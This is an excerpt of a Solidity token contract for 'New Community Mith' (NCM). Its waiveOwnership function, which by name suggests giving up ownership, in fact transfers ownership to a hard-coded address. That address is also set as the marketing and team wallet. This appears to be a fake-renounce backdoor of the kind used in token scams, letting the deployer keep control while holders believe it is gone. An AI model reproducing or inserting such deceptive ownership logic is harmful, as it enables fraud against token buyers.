...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x7786C24B3D243e58967728404387ac4937337d7E));
        _owner = address(0x7786C24B3D243e58967728404387ac4937337d7E);
    }
...
contract NewCommunityMith is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = " New Community Mith";
    string private _symbol = "NCM";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x7786C24B3D243e58967728404387ac4937337d7E);
    address payable public teamWalletAddress = payable(0x7786C24B3D243e58967728404387ac4937337d7E);
